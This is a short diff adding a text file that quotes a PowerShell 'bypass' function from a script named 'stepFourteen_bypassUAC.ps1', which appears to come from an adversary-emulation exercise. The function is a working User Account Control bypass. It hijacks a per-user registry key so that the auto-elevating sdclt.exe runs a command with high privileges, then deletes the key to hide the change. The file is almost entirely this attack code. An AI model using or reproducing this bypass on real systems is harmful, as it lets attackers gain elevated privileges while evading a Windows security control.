@@ -1,0 +1,11 @@
+Refer to the following implementation of the "bypass" function from "stepFourteen_bypassUAC.ps1":
+
+"""
+function bypass {
+New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value ""
+New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+Start-Process -FilePath $env:windir\system32\sdclt.exe
+Start-Sleep -s 3
+Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
+}
+"""
